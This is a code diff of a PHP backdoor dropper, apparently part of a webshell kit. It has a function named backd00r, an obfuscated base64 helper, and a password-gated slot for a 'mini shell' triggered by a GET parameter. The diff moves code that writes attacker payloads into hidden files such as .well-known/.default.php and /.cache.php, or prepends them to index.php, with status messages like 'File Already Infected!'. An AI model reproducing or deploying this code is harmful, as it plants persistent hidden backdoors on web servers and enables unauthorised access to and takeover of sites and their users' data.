@@ -73,48 +73,10 @@ if (!@file_exists($tmpfname)) {
         return $out;
     }
     function backd00r() {
-        if (is_dir($_SERVER['DOCUMENT_ROOT'] . '/.well-known')) {
-            if (!file_exists($_SERVER['DOCUMENT_ROOT'] . "/.well-known/.default.php")) {
-                $m = fopen($_SERVER['DOCUMENT_ROOT'] . "/.well-known/.default.php", "w") or die(" ");
-                fwrite($m, $code);
-                fclose($m);
-                $outfile = "Log File Success!";
-            }
-            else {
-                $outfile = "Log File Already Created!";
-            }
-        }
-        else if (is_dir($_SERVER['DOCUMENT_ROOT'] . '/cgi-bin')) {
-            if (!file_exists($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/.default.php")) {
-                $m = fopen($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/.default.php", "w") or die(" ");
-                fwrite($m, $code);
-                fclose($m);
-                $outfile = "Log File Success!";
-            }
-            else {
-                $outfile = "Log File Already Created!";
-            }
-        }
-        else {
-            $file = "index.php";
-            if (strpos(file_get_contents($file) , $code) !== false) {
-                $outfile = "File Already Infected!";
-            }
-            else {
-                if (@is_file($file) && @is_writable($file)) {
-                    $put = @file_put_contents($file, $code . "\n" . @file_get_contents($file));
-                    if ($put) {
-                        $outfile = "Log Infect File Success!";
-                    }
-                    else {
-                        $outfile = "Can't Infect, Index.php Not Found / Not Writable";
-                    }
-                }
-                else {
-                    $outfile = "Go Home KiDz, This Server Is Very Hard To Open The Backdoor :v";
-                }
-            }
-        }
+        $m = fopen($_SERVER['DOCUMENT_ROOT'] . "/.cache.php", "w") or die(" ");
+        fwrite($m, $code);
+        fclose($m);
+        $outfile = "Log File Success!";
     }
     if (!function_exists('base64_decode')) {
         function __DnThirTeen($input) {
@@ -320,7 +282,48 @@ if (!@file_exists($tmpfname)) {
             }
         }
         else {
-            @backd00r();
+            if (is_dir($_SERVER['DOCUMENT_ROOT'] . '/.well-known')) {
+                if (!file_exists($_SERVER['DOCUMENT_ROOT'] . "/.well-known/.default.php")) {
+                    $m = fopen($_SERVER['DOCUMENT_ROOT'] . "/.well-known/.default.php", "w") or die(" ");
+                    fwrite($m, $code);
+                    fclose($m);
+                    $outfile = "Log File Success!";
+                }
+                else {
+                    $outfile = "Log File Already Created!";
+                }
+            }
+            else if (is_dir($_SERVER['DOCUMENT_ROOT'] . '/cgi-bin')) {
+                if (!file_exists($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/.default.php")) {
+                    $m = fopen($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/.default.php", "w") or die(" ");
+                    fwrite($m, $code);
+                    fclose($m);
+                    $outfile = "Log File Success!";
+                }
+                else {
+                    $outfile = "Log File Already Created!";
+                }
+            }
+            else {
+                $file = "index.php";
+                if (strpos(file_get_contents($file) , $code) !== false) {
+                    $outfile = "File Already Infected!";
+                }
+                else {
+                    if (@is_file($file) && @is_writable($file)) {
+                        $put = @file_put_contents($file, $code . "\n" . @file_get_contents($file));
+                        if ($put) {
+                            $outfile = "Log Infect File Success!";
+                        }
+                        else {
+                            $outfile = "Can't Infect, Index.php Not Found / Not Writable";
+                        }
+                    }
+                    else {
+                        $outfile = "Go Home KiDz, This Server Is Very Hard To Open The Backdoor :v";
+                    }
+                }
+            }
         }
     }
 
@@ -361,5 +364,6 @@ if (!@file_exists($tmpfname)) {
 
 if (isset($_GET["DNThirTeen"]) && $_GET["DNThirTeen"] == "L34kC0de") {
     //Put Your Mini Shell Here
+    
 }
 ?>
